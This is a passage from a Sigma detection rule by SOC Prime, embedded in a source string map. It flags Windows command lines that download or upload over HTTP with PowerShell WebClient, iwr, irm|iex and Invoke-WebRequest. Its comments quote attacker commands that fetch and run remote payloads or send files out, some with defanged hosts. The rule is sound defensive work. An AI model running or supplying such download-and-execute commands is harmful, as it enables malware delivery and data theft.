author: SOC Prime Team
logsource:
    category: process_creation
    product: windows
detection:
    selection_bin:
        Image|endswith: '.exe'
    selection1:
        CommandLine|contains|all:
            - 'Web' #$v1='Net.We'; $v2='bClient'; $var = (New-Object $v1$v2)
            - 'Client'
            - 'New-Object'
    selection2:
        CommandLine|contains:
            - '.DownloadData' #https://cert.gov.ua/article/6281681; https://blog.deception.pro/blog/clickfix-hok-velvet-tempest-termite; https://www.esentire.com/blog/malware-as-a-service-cocktail-errtraffic-and-cruciferra-killing-your-edr-since-2025
            - '.DownloadString' #https://cert.gov.ua/article/6282902; https://asec.ahnlab.com/en/91166/; https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492; https://hunt.io/blog/iranian-nexus-oman-government-intrusion; https://www.security.com/threat-intelligence/iran-seedworm-electronics; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline; https://www.zscaler.com/blogs/security-research/seo-poisoning-campaign-delivers-new-armorsteal-malware
            - '.DownloadFile' #https://www.picussecurity.com/resource/blog/xhunt-apt-cyber-espionage-operations-targeting-kuwait-and-exchange-servers; # https://www.pointwild.com/threat-intelligence/covert-rat-phishing-campaign/; https://www.bitsight.com/blog/ransomware-twizt-inside-phorpiex-botnet; https://thehackernews.com/2026/05/daemon-tools-supply-chain-attack.html; https://asec.ahnlab.com/en/94685/; https://www.securonix.com/blog/smoke-screen-screenconnect-rmm-abuse-cloudflare-tunnels/; https://www.rstcloud.com/ftp-banner-dead-drops-a-hunters-field-guide-to-e4del-and-pinhole/
            - '.UploadString'
            - '.uploaddata' #..net.webclient;$ujk.uploaddata('http:/...
            - '.UriBuilder' #..system.UriBuilder('ab://' + '{url_to_powershell_script}'..
            - '.UploadFile' #wc.UploadFile("http://127.0.0.1:5000/success","C:\Users\K3vin\Downloads\log.txt"); https://ctrlaltintel.com/threat%20research/MuddyWater/
    selection3:
        - CommandLine|contains|all:
            #- 'powershell'
            - 'iwr ' #...iwr http://xxx.pl/grafika/docx.exe -OutFile "C:\Users\$ENV:UserName\docx.exe";...'; https://cert.gov.ua/article/6282902; https://www.picussecurity.com/resource/blog/fog-ransomware-2025-deep-dive-into-ttps; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/; https://www.trendmicro.com/en_us/research/26/a/analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html; https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/; https://www.elastic.co/security-labs/phantom-in-the-vault; https://arcticwolf.com/resources/blog/bluenoroff-uses-clickfix-fileless-powershell-and-ai-generated-zoom-meetings-to-target-web3-sector/; https://asec.ahnlab.com/en/94995/; https://www.elastic.co/security-labs/threat-command/malicious-browser-extension-kremlin-banking-malware; https://asec.ahnlab.com/en/95516/
            - 'http'
        - CommandLine|contains|all:
            #- 'powershell'
            - 'irm ' #invoke rest method powershell -c "irm bun.sh/install.ps1|iex"; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/
            - 'http'
        - CommandLine|contains|all:
            - 'wget ' # https://www.esentire.com/blog/dindoor-denorat-and-nightshadec2-analyzing-tag-150s-evolving-tradecraft; https://www.zscaler.com/blogs/security-research/operation-rapidrust-apt36-deploys-rustyshade-rustymove-psnatch-and
            - 'http'
        - CommandLine|contains|all:
            #- 'powershell'
            - 'invoke' #https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399; https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/; https://www.catonetworks.com/blog/cato-ctrl-vishing-and-microsoft-teams-used-deliver-phantombackdoor/; https://labs.k7computing.com/index.php/resoker-a-telegram-based-remote-access-trojan/; https://www.malwarebytes.com/blog/bugs/2026/05/700-education-and-tech-websites-hijacked-in-huge-clickfix-malware-campaign; https://www.seqrite.com/blog/operation-shadowrecruit-a-recruitment-themed-malware-campaign-leveraging-controlr-and-google-sheets-to-target-indian-job-seekers/; https://www.huntress.com/blog/sql-injection-attacker-persistence
            - 'webrequest' #https://www.elastic.co/security-labs/a-wretch-client; https://meltedinhex.com/posts/clickfix-errtraffic-blockchain-c2/; https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/; https://zerobec.com/blog/operation-bluedash-multi-rmm-workplace-phishing; https://www.zscaler.com/blogs/security-research/helpdesk-hijackers-teams-vishing-quick-assist-and-gogrpc-backdoor; https://fieldeffect.com/blog/clickfix-cluster-observed-activity-recent-campaigns; https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/; https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure
            - 'http' #powershell.exe invoke-webrequest -uri “hxxp://45.58.52[.]82/up.dat” -outfile “c:\programdata\img.dat”; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/; https://blog.talosintelligence.com/uat-8099-new-persistence-mechanisms-and-regional-focus/; https://www.proofpoint.com/us/blog/threat-insight/dont-trustconnect-its-a-rat?utm_source=twitter&utm_medium=social_organic; https://www.picussecurity.com/resource/blog/t1059-001-powershell; https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html
        - CommandLine|contains|all:
            - 'InstallProduct'
            - 'http'
        - CommandLine|contains|all:
            #- 'powershell'
            - 'invoke'
            - 'RestMethod' #https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399; https://sect.iij.ad.jp/blog/2026/03/dropbox-api-kimsuky-malware/; https://asec.ahnlab.com/en/93151/
        - CommandLine|contains|all:
            - 'irm' # powershell irm maliciousdomain[.]com | iex; https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and; https://www.levelblue.com/blogs/spiderlabs-blog/how-clickfix-opens-the-door-to-stealthy-stealc-information-stealer; https://www.proofpoint.com/us/blog/threat-insight/dont-trustconnect-its-a-rat; https://www.recordedfuture.com/research/clickfix-campaigns-targeting-windows-and-macos; https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ai-written-malware-vibe-coded-campaign/; https://www.rapid7.com/blog/post/tr-operation-asterix-crypto-fraud-vishing-phishing/
            - 'iex' # https://reliaquest.com/blog/threat-spotlight-deepload-malware-pairs-clickfix-delivery-with-ai-generated-evasion/; https://www.jumpsec.com/guides/inside-a-dprk-bluenoroff-clickfix-kit/; https://www.bleepingcomputer.com/news/security/steam-forum-clickfix-attacks-infect-gamers-with-xmrig-cryptominers/; https://www.microsoft.com/en-us/security/blog/2026/09/02/impersonating-it-support-threat-actors-turn-remote-session-into-enterprise-wide-access/
    filters:
        - Image|endswith: 'MicrosoftEdgeUpdate.exe'
        - ParentImage|contains: 'CRUWBlocker-' #write blocker software CRUWBlocker-1.2.1.2-(2018.09.04).tmp
        - ParentImage|endswith:
            - '_1st.exe' #PICUS BAS
            - 'mssense.exe' #Defender
        - Image|endswith:
            - 'SenseNdr.exe' #Defender
            - 'codex-computer-use.exe'
        - CommandLine|contains:
            - 'licensing.mp.microsoft.com/' #powershell.exe  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://licensing.mp.microsoft.com/v7.0/licenses/content -Method POST"
            - '127.0.0.1' # Local host
            - 'https://astral.sh'
        - CommandLine|contains|all:
            - 'crashpad_handler'
            - 'database'
        - CommandLine|contains|all:
            - 'officecdn.microsoft.com/'
            - '.cab' #"powershell" -command "& { (New-Object Net.WebClient).DownloadFile('http://officecdn.microsoft.com/pr/f2e724c1-748f-4b47-8fb8-8e0d210e9208/Office/Data/16.0.10412.20006/i641033.cab', 'C:\Users\xxx\AppData\Local\Temp\over568100\i641033.cab') }"
        - CommandLine|contains|all:
            - 'chrome'
            - 'single' # "chrome.exe" --single-argument https://identity...
            - 'argument'
        - CommandLine|contains|all:
            - 'sysvol' #GPO contains powershell sctipts.
            - 'Policies'
        - CommandLine|contains|all:
            - 'echo '
            - 'nessus_cmd_' #C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe  echo nessus_cmd_Z2V0LWhlbHAgSW52b2tlLVJlc3RNZXRob2Q=_start ; get-help Invoke-RestMethod ; echo nessus_cmd_Z2V0LWhlbHAgSW52b2tlLVJlc3RNZXRob2Q=_stop ; echo nessus_cmd_SW52b2tlLVJlc3RNZXRob2QgLU1ldGhvZCBHRVQgLUhlYWRlcnMgQHt9IGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvb3BjL3YxL2luc3RhbmNlIDI+JjE=_start ; Invoke-RestMethod -Method GET -Headers @{} http://169.254.169.254/opc/v1/instance ; echo nessus_cmd_SW52b2tlLVJlc3RNZXRob2QgLU1ldGhvZCBHRVQgLUhlYWRlcnMgQHt9IGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvb3BjL3YxL2luc3RhbmNlIDI+JjE=_stop ;
        - CommandLine|contains|all:
            - 'slackb.com' #GPO contains powershell sctipts.
            - 'WebRequest'
            - 'Servicing_Channel' #powershell.exe -c Invoke-WebRequest -Uri https://slackb.com/error -M...537.36 OS_Product/Workstation Servicing_Channel/SAC...| ConvertTo-Json
    condition: selection_bin and ((selection1 and selection2) or selection3) and not filters
falsepositives:
    - Administrative activity
level: high
"#,
  // Possible Malicious VBS File with Double Extension (via cmdline)
  "6acf6fdb-d2a9-491c-bb2e-f84f8398dcc2": r#"title: Possible Malicious VBS File with Double Extension (via cmdline)
